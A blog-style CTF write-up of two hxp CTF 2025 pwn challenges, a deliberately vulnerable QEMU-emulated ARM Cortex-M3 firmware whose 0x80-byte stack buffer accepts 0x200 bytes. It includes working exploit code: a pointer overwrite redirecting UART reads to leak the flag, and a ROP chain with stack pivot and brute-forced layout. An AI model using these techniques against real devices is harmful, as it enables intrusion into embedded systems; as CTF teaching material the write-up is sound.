---
layout: post
title: "hxp CTF 2025 - orakel-von-hxp/cassandra-von-hxp"
date: 2026-04-22
categories: [meta]
---

# orakel-von-hxp

There will be 2 tasks in this writeup, since the first one had an unintended solution (actually, both did), so the organizers released a revenge challenge.

## Challenge Overview

Challenge entrypoint is `start.py`:

```python
#!/usr/bin/env python3

import ctypes
import ctypes.util
import os
import pathlib
import random
import signal
import socket
import sys
import subprocess
import tempfile
import time

random = random.SystemRandom()

def prctl_set_pdeathsig(signo: signal.Signals):
    PR_SET_PDEATHSIG = 1
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    if libc.prctl(PR_SET_PDEATHSIG, signo):
        raise OSError(ctypes.get_errno(), "prctl(PR_SET_PDEATHSIG, ...)")

def main(log):
    log("Generating linker script...")
    curpath = pathlib.Path(os.getcwd())
    flagpath = pathlib.Path("/home/ctf/src/flag.txt")

    with open("ld/lm3s6965_layout.ld.template", "r") as inscript:
        raw_script = inscript.read()

    parts = raw_script.split("SNIPSNIPSNIP")

    all_sections = [
        ".text",
        ".text.irq_master_enable",
        ".text.shitty_putchar",
        ".text.main",
        ".text.irq_master_disable",
        ".text._Unused_Handler",
        ".text.m_seedRand",
        ".text.seedRand",
        ".text.genRandLong",
        ".text.serial_putchar_generic",
        ".text.serial_putchar",
        ".text.serial_getchar_generic",
        ".text.serial_puts",
        ".text.serial_fgets",
        ".text.system_time_incr",
        ".text.delay",
        ".text.ulli2a",
        ".text.lli2a",
        ".text.uli2a",
        ".text.li2a",
        ".text.ui2a",
        ".text.i2a",
        ".text.a2d",
        ".text.a2u",
        ".text.putchw",
        ".text.tfp_format",
        ".text.init_printf",
        ".text.tfp_printf",
        ".text.nvic_irq_enable",
        ".text.sysctl_wait_pll_lock",
        ".text.sysctl_delay",
        ".text.sysctl_setclk",
        ".text.sysctl_getclk",
        ".text.sysctl_periph_clk_enable",
        ".text.systick_enable",
        ".text.systick_irq_enable",
        ".text.systick_millisec_to_timer_period",
        ".text.systick_set_period_ms",
        ".text._SysTick_Handler",
        ".text.uart_enable",
        ".text.uart_disable",
        ".text.uart_set_baudrate",
        ".text.uart_set_example_line_ctrls",
        ".text.uart_irq_clear",
        ".text.uart_irq_status",
        ".text.uart_init",
        ".text.uart_tx_byte",
        ".text.uart_rx_byte",
        ".text.uart_irq_handler",
        ".text.uart0_irq_handler",
        ".text.uart1_irq_handler",
        ".text.__udivmoddi4",
        ".text.strncmp",
    ]

    random.shuffle(all_sections)

    shuffled = ""
    for section in all_sections:
        shuffled += f"            *({section})\n"

    with tempfile.TemporaryDirectory(delete=False) as tempdir: # os.fork going to cause problem otherwise
        ptd = pathlib.Path(tempdir)
        (ptd / "build").mkdir(parents=True)

        with open(ptd / "layout.ld", "w") as outfile:
            outfile.write(parts[0])
            outfile.write(shuffled)
            outfile.write(parts[1])

        (ptd / "build" / "src" / "orakel_von_hxp_CM3").unlink(missing_ok = True)
        for file in (ptd / "build" / "src").glob("orakel_von_hxp_CM3*"):
            file.unlink(missing_ok = True)

        os.chdir(str(ptd / "build"))

        # Needed to make cmake find itself
        os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

        subprocess.run(["cmake", f"-DCMAKE_TOOLCHAIN_FILE={curpath / 'cmake/arm-none-eabi.cmake'}", f"-DLINKER_SCRIPT={ptd / 'layout.ld'}", str(curpath)], check=True)
        subprocess.run(["make", "bin"], check=True)

        flag_inserter_pid = os.fork()
        if flag_inserter_pid == 0:
            os.closerange(0, 1)
            os.closerange(3, 0x7fffffff)
            prctl_set_pdeathsig(signal.SIGKILL)

            flagsock = ptd / "flag.sock"
            log(f"Probing for flag socket at {flagsock}")
            while not flagsock.exists():
                log("Waiting...")
                time.sleep(1)

            fs = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            fs.connect(str(flagsock))

            flag = flagpath.read_text().strip() if flagpath.exists() else "hxp{FAKEFLAGFAKEFLAGFAKEFLAGFAKEFLAG}"

            time.sleep(3)
            while True:
                time.sleep(2)
                fs.sendall(f"{flag} {flag}\n".encode("utf-8"))

        os.execvp("qemu-system-arm", [
            "qemu-system-arm",
                "-accel", "tcg,tb-size=32",
                "-M", "lm3s6965evb",
                "-kernel", "src/orakel-von-hxp_CM3.bin",
                "-nographic",
                "-monitor", "none",
                "-serial", "stdio",
                "-serial", "unix:" + str(ptd / "flag.sock") + ",server"
        ])

if __name__ == "__main__":
    log = print if "--local" in sys.argv else lambda *args, **kwargs: None
    main(log)
```

We can see it compiles a binary using custom linker script template, with some sections being shuffled. The shuffled sections are inserted at "SNIPSNIPSNIP":

```c
/* This linkerscript is derived from the memory layout of TI Stellaris LM3S6965
 * Refer Refer: http://www.ti.com/lit/ds/symlink/lm3s6965.pdf Table 2-4
 */

MEMORY {
        FLASH (rx) : ORIGIN = 0x00000000, LENGTH = 256K
        SRAM  (rw) : ORIGIN = 0x20000000, LENGTH = 64K
}

SECTIONS {
        . = 0x00000000;
        .text : {
            KEEP(*(.vectors))
            *(.startup)
            SNIPSNIPSNIP
            *(.rodata)
            . = ALIGN(4);
        } > FLASH
        
        .data : {
            . = ALIGN(4);
            _sram_sdata = .;
            *(.data);
            . = ALIGN(4);
            _sram_edata = .;
        } > SRAM AT > FLASH

        _flash_sdata = LOADADDR(.data);

        .bss :{
            . = ALIGN(4);
            _sram_sbss = .;
            *(.bss)
            *(COMMON)
            . = ALIGN(4);
            _sram_ebss = .;
        } > SRAM

        _sram_stacktop = ORIGIN(SRAM) + LENGTH(SRAM);
}
```

It's worth noting that other sections like `.rodata`, `.data`, `.bss` are at fixed positions.
Looking at `CMakeLists.txt`, we can see it's an emulated embedded hardware that runs on ARM Cortex-M3:

```
cmake_minimum_required(VERSION 3.30)

project(orakel-von-hxp LANGUAGES C CXX ASM)

set(CMAKE_TOOLCHAIN_FILE "${CMAKE_CURRENT_LIST_DIR}/cmake/arm-none-eabi.cmake")
set(CPU_OPTIONS "-mcpu=cortex-m3")
set(CHIP_DEFS "CORE_CM3" CACHE STRING "Chip Compiler Definition")
set(BIN_SUFFIX "CM3")
if(NOT(DEFINED LINKER_SCRIPT))
    set(LINKER_SCRIPT ld/layout.ld)
endif()
set(CMAKE_EXPORT_COMPILE_COMMANDS true)
set(BINDIR "src")

set(CMAKE_C_FLAGS_DEBUG "-O0 -g -DDEBUG")
set(CMAKE_CXX_FLAGS_DEBUG "-O0 -g")
set(CMAKE_C_FLAGS_RELEASE "-O0 -g")
set(CMAKE_CXX_FLAGS_RELEASE "-O0 -g")

set(MORE_COMPILER_OPTIONS     
    "${CPU_OPTIONS}"
    "$<$<COMPILE_LANGUAGE:C>:-std=c11>"
    "$<$<COMPILE_LANGUAGE:CXX>:-std=c++17>"
    "$<$<COMPILE_LANGUAGE:CXX>:-fms-extensions>"
    "$<$<COMPILE_LANGUAGE:CXX>:-fno-exceptions>"
    "$<$<COMPILE_LANGUAGE:CXX>:-fno-rtti>"
    "$<$<COMPILE_LANGUAGE:CXX>:-fno-use-cxa-atexit>"
    "$<$<COMPILE_LANGUAGE:CXX>:-fno-threadsafe-statics>"
    "-fstrict-volatile-bitfields"
    "-ffunction-sections"
    "$<$<COMPILE_LANGUAGE:CXX>:-fno-threadsafe-statics>"
    "-mthumb"
    "-mfloat-abi=soft"
    "-mfpu=fpv4-sp-d16"
    "-Wall"
    "-Wextra"
    "-Wcast-align"
    "-Wconversion"
    "$<$<COMPILE_LANGUAGE:CXX>:-Wold-style-cast>"
    "-Wshadow"
    "-Wlogical-op"
    "$<$<COMPILE_LANGUAGE:CXX>:-Wsuggest-override>"
    "-Wsuggest-final-types"
    "-Wsuggest-final-methods"
    "-pedantic"
	"-ffile-prefix-map=${CMAKE_SOURCE_DIR}=."
)


add_subdirectory("src")

add_custom_command(OUTPUT ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.srec
    DEPENDS ${PROJECT_NAME}_${BIN_SUFFIX}
    COMMAND ${CMAKE_OBJCOPY} -Osrec ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX} ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.srec
)
add_custom_command(OUTPUT ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.hex
    DEPENDS ${PROJECT_NAME}_${BIN_SUFFIX}
    COMMAND ${CMAKE_OBJCOPY} -Oihex ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX} ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.hex
)
add_custom_command(OUTPUT ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin
    DEPENDS ${PROJECT_NAME}_${BIN_SUFFIX}
    COMMAND ${CMAKE_OBJCOPY} -Obinary ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX} ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin
)
add_custom_command(OUTPUT ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.lst
    DEPENDS ${PROJECT_NAME}_${BIN_SUFFIX}
    COMMAND ${CMAKE_OBJDUMP} -S ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX} > ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.lst
)
add_custom_command(OUTPUT ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.sym
    DEPENDS ${PROJECT_NAME}_${BIN_SUFFIX}
    COMMAND ${CMAKE_NM} -C -l -n -S ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX} > ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.sym
)

add_custom_command(
    DEPENDS ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin
    COMMAND qemu-system-arm -M lm3s6965evb -kernel ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin -nographic -serial tcp::1235,server
    COMMAND ${CMAKE_COMMAND} -E touch my-file.stamp
    OUTPUT qemu.stamp
)

add_custom_command(
    DEPENDS ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin
    COMMAND qemu-system-arm -s -S -M lm3s6965evb -kernel ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin -nographic -serial tcp::1235,server
    COMMAND ${CMAKE_COMMAND} -E touch my-file.stamp
    OUTPUT qemu-debug.stamp
)

add_custom_target(srec
    DEPENDS ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.srec
)
add_custom_target(hex
    DEPENDS ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.hex
)
add_custom_target(bin
    DEPENDS ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin
)
add_custom_target(lst
    DEPENDS ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.lst
)
add_custom_target(sym
    DEPENDS ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.sym
)
add_custom_target(qemu
    DEPENDS qemu.stamp
)
add_custom_target(qemu-debug
    DEPENDS qemu-debug.stamp    
)
add_custom_target(flash
    st-flash write ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin ${BASE_ADDRESS}
    DEPENDS ${BINDIR}/${PROJECT_NAME}_${BIN_SUFFIX}.bin
)
```

Later on, we can see a forked process sending flag to flag.sock:

```python
        flag_inserter_pid = os.fork()
        if flag_inserter_pid == 0:
            os.closerange(0, 1)
            os.closerange(3, 0x7fffffff)
            prctl_set_pdeathsig(signal.SIGKILL)

            flagsock = ptd / "flag.sock"
            log(f"Probing for flag socket at {flagsock}")
            while not flagsock.exists():
                log("Waiting...")
                time.sleep(1)

            fs = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            fs.connect(str(flagsock))

            flag = flagpath.read_text().strip() if flagpath.exists() else "hxp{FAKEFLAGFAKEFLAGFAKEFLAGFAKEFLAG}"

            time.sleep(3)
            while True:
                time.sleep(2)
                fs.sendall(f"{flag} {flag}\n".encode("utf-8"))
```

and main process launching qemu with the compiled `src/orakel-von-hxp_CM3.bin` binary:

```python
        os.execvp("qemu-system-arm", [
            "qemu-system-arm",
                "-accel", "tcg,tb-size=32",
                "-M", "lm3s6965evb",
                "-kernel", "src/orakel-von-hxp_CM3.bin",
                "-nographic",
                "-monitor", "none",
                "-serial", "stdio",
                "-serial", "unix:" + str(ptd / "flag.sock") + ",server"
        ])
```

notice the flag.sock connected to one of the serial ports.

Now, let's analyze the program's source code:

```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "drivers/irq.h"
#include "drivers/nvic.h"
#include "drivers/sysctl.h"
#include "drivers/systick.h"
#include "os/system_time.h"
#include "drivers/uart_drv.h"
#include "os/serial_io.h"
#include "os/task_scheduler.h"
#include "mtwister.h"
#include "os/tinyprintf.h"

/* main() represents the entry point in a c program.
 * In this bare-metal system, main represents the 
 * function where we initialize the various peripherals and 
 * in a way serves as an entry point to the (initialized) system
 */

const char *enlightened = "I am enlightened";

void shitty_putchar(void* p, char c)
{
    serial_putchar_generic(p, c);
}

int main(void)
{
    uint32_t clk_cfg1, clk_cfg2;
    uint32_t buffer[0x20];
    char* sbuf = (char*) buffer;

    /* Let's now re-enable the interrupts*/
    irq_master_enable();

    /* Also, let's also turn on the UART0 interrupt */
    nvic_irq_enable(IRQ_UART0);

    /* Set the system clock to the PLL with the main oscillator as the source
     * with the crystal frequency set to 8 MHz. 
     * Divide the PLL output clock frquency by a factor of 12.
     * Turn off the (unused) internal oscillator. This is to configure a system clock of 16.67 MHz.
     */
    clk_cfg1 = (SYSCTL_PLL_SYSCLK | SYSCTL_RCC_USESYSDIV | SYSCTL_RCC_SYSDIV_11 | 
               SYSCTL_RCC_XTAL_8MHZ | SYSCTL_RCC_OSCSRC_MOSC | SYSCTL_RCC_IOSCDIS);
    clk_cfg2 = 0;

    sysctl_setclk(clk_cfg1, clk_cfg2);
    
    /* Let's set systick period to be 1 milliseconds =>
     * a count of system clock frequency divided by 2.
     */
    systick_set_period_ms(1u);

    /* Let's enable the systick timer and it's interrupt */
    systick_irq_enable();
    systick_enable();

    init_printf((void*)uart0, shitty_putchar);

    /* Configure the uart to a baud-rate of 115200 */
    uart_init(uart0, UART_BAUD_115200);

    serial_puts("Welcome to Orakel von hxp.\n");
    serial_puts("Check out our special offer! Only for a limited time you can ask the oracle as many questions as you like in one sitting.");
    serial_puts("Just utter 'I am enlightened' to quit asking questions.\n");
    serial_puts("\n\n");

    while(1)
    {
        serial_puts("Please ask your question as clearly as possible: ");
        serial_fgets(sbuf, 0x200, uart0);
        if(strncmp(sbuf, enlightened, 16) == 0) break;

        tfp_printf("Your question was %s (0x%x). The oracle is thinking...\n", sbuf, *buffer);
        
        seedRand(*buffer);

        uint32_t *location = (uint32_t*)genRandLong();

        // TODO: what does qemu do if we yolo random memory?
        delay(1000);

        if(uart1->CTL & UARTCTL_UARTEN)
        {
            serial_puts("The oracle is screaming, what have you done?!?");
        }
        else 
        {
            printf("The oracle answered 0x%x.\n", *location);
        }
    }

    serial_puts("Barba non facit philosophum, neque vile gerere pallium.");
    // TODO: automatically kill qemu after this
    
    return 0;
}
```

We can see it uses UART0 and UART1 ports, where uart0 is connected to stdio, and uart1 is connected to flag.sock:

```python
                "-serial", "stdio",
                "-serial", "unix:" + str(ptd / "flag.sock") + ",server"
```

It uses some wrappers for IO functions, e.g.

```c
void serial_putchar_generic(volatile uart_regs *uart, const char c)
{
    uart_tx_byte(uart, c);
}

/* Output a character */
void serial_putchar(const char c)
{
    serial_putchar_generic(uart0,  c);
}
```

but these functions just handle stuff related to UART communication, so let's not dive too deep into it, since we can clearly see the buffer overflow in the main function:

```c
    uint32_t buffer[0x20];
    char* sbuf = (char*) buffer;

...

    while(1)
    {
        serial_puts("Please ask your question as clearly as possible: ");
        serial_fgets(sbuf, 0x200, uart0);
        if(strncmp(sbuf, enlightened, 16) == 0) break;
```

buffer is 0x80 bytes long, but 0x200 bytes are read. This means ROP and overwriting local variables on the stack become viable options. But the main question is, how do we read the flag? Well, the flag is being sent to uart1 interface, so we need to find some way to read from it.
Notice that `serial_fgets` reads data into wherever `sbuf` points to, but `sbuf` is on the stack, so if we overwrite it, we get an arbitrary read/write primitive.
Second observation, uart0/uart1 are static variables:

```c
  static volatile uart_regs *uart0 = (uart_regs*)UART0_BASE;   // 0x4000C000               
  static volatile uart_regs *uart1 = (uart_regs*)UART1_BASE;   // 0x4000D000
```

They live in the `.data` section, which is at a fixed location. That's the unintended bug in this challenge. During the CTF, I just overwrote the `uart0` variable with `UART1_BASE` to see what happens:

```python
uart0_ptr_addr = 0x20000000
uart1_addr = 0x4000D000
sbuf_offset = 0x8C

payload = flat({
  sbuf_offset: p32(uart0_ptr_addr)
})

io.sendlineafter(b'Please ask your question as clearly as possible:', payload)
io.sendlineafter(b'Please ask your question as clearly as possible:', p32(uart1_addr))
io.sendlineafter(b'Please ask your question as clearly as possible:', b'I am enlightened')
    
io.interactive()
```

turns out, it printed out the flag:

```bash
❯ ./exploit-orakel.py LOCAL
[+] Starting local process '/home/wb/ace/ctf/hxp2025/orakel_von_hxp/orakel-von-hxp/src/start.py': pid 15154
[*] Switching to interactive mode
 
Your question was hxp{FAKEFLAGFAKEFLAGFAKEFLAGFAKEFLAG} hxp{FAKEFLAGFAKEFLAGFAKEFLAGFAKEFLAG}
 (0x61616161). The oracle is thinking...
$  
```

What happens is that `serial_fgets` reads from `uart1` instead of `uart0` here:

```c
serial_fgets(sbuf, 0x200, uart0);
```

so `sbuf` got populated with the flag sent by the forked process, and the flag was printed by `tfp_printf`.

Full exploit: [exploit-orakel.py]({{ site.baseurl }}/assets/orakel-cassandra-von-hxp/exploit-orakel.py)

But how is it able to print it? After overwriting the variable, it should no longer be connected to stdout. The magic happens in `init_printf`:

```c
init_printf((void*)uart0, shitty_putchar);
```

It caches uart0 address in a static variable:

```c
static putcf stdout_putf;
static void *stdout_putp;

void init_printf(void *putp, putcf putf)
{
    stdout_putf = putf;
    stdout_putp = putp;
}
```

so tfp_printf still targets real UART0 after the redirect.

## cassandra-von-hxp

Later, the organizers released an updated version of the challenge. The difference is that `serial_fgets` no longer uses the `uart0` variable:

```diff
-        serial_fgets(sbuf, 0x200, (uart_regs*)UART0_BASE);
+        serial_fgets(sbuf, 0x200, uart0);
```

our trick won't work anymore, but buffer overflow is still there. Another difference is that uart1 is no longer initialized in main:

```diff
    /* Configure the uart to a baud-rate of 115200 */
    uart_init(uart0, UART_BAUD_115200);
-   uart_init(uart1, UART_BAUD_115200);

```

I started considering ROP possibilities, but there is one thing that makes it tricky — the sections are shuffled, so we don't know where the gadgets are. But we don't actually need to know the location of all the sections, we just need to know the location of one of them, and we can use the arbitrary read primitive to read `BL` instruction targets to find other sections.
At this point, I assumed I'll be able to solve that problem later on, so I modified `start.py` to use some constant seed to make the section-shuffling deterministic, and started to look for some useful gadgets. First, we'll need to find a way to enable uart1. In order to do so, we can use these 2 gadgets:

```
# 0x00000244 (main) (0xf4): mov sp, r7 ; pop {r7, pc}
# 0x00000ce4 (uart_init) (0x24): ldr r0, [r7, #4] ; bl 0x490 ; nop ; adds r7, #8 ; mov sp, r7 ; pop {r7, pc}
```

Second gadget is located just before a call to `uart_enable` in `uart_init`:

![gadget1.png]({{ site.baseurl }}/assets/orakel-cassandra-von-hxp/gadget1.png)

Additionally, at the end of executing this gadget, `R2` register is set to `UART1_BASE`:

![gadget2.png]({{ site.baseurl }}/assets/orakel-cassandra-von-hxp/gadget2.png)

This is very useful, because after that, we'll jump right before call to `serial_fgets` in `main`:

![main.png]({{ site.baseurl }}/assets/orakel-cassandra-von-hxp/main.png)

There is one more issue, there are only 8 more bytes of memory mapped after return address of main:

![ret.png]({{ site.baseurl }}/assets/orakel-cassandra-von-hxp/ret.png)

So we'll have to pivot the `SP` register to some other writable memory region (`buffer` in the script below) first.

```python
buffer_addr = 0x2000ff58
...
extra_offset = 0x400

ropchain1_offset = 0x18
uart_addr_offset = 0x18 + 8
ropchain1_addr = buffer_addr - extra_offset + ropchain1_offset
uart_init_gadget_r7 = buffer_addr - extra_offset + uart_addr_offset - 4
ropchain1 = p32(uart_init_gadget_r7) + p32(uart_init_gadget)
ropchain2_offset = uart_addr_offset + 4
ropchain2 = p32(buffer_addr+0x30-extra_offset) + p32((func_base_addr['main']+0x76) | 1)

payload1 = flat({
  sbuf_offset: p32(buffer_addr-extra_offset),
  ret_addr_offset-4: p32(ropchain1_addr),
  ret_addr_offset: p32(mov_sp_r7_pop_r7_pc),
})
```

After that we can execute our ropchain and get the flag:

```python
new_sbuf_ptr_offset = 0xbc

payload2 = flat({
  ropchain1_offset: ropchain1,
  uart_addr_offset: p32(uart1_addr),
  ropchain2_offset: ropchain2,
  new_sbuf_ptr_offset: p32(buffer_addr),
})

assert b'\n' not in payload1 and len(payload1) < 0x200 
assert b'\n' not in payload2 and len(payload2) < 0x200

io.sendlineafter(b'Please ask your question as clearly as possible:', payload1)
io.sendlineafter(b'Please ask your question as clearly as possible:', payload2)
io.sendlineafter(b'Please ask your question as clearly as possible:', b'I am enlightened')
```

To solve the "shuffled sections" problem, I just used brute force. I assumed first section is `.text.main` - there is 1/53 chance this will be true, and just ran the script in the loop until I got the flag.

Full exploit: [exploit-cassandra.py]({{ site.baseurl }}/assets/orakel-cassandra-von-hxp/exploit-cassandra.py)

## (Real) unintended solution

Remember when I said both challenges had an unintended solution? After the CTF I learned that the stack was executable...
The author did not intend it to be executable but turns out it was because of some QEMU quirk. Could've solved it much easier, but I had fun anyway.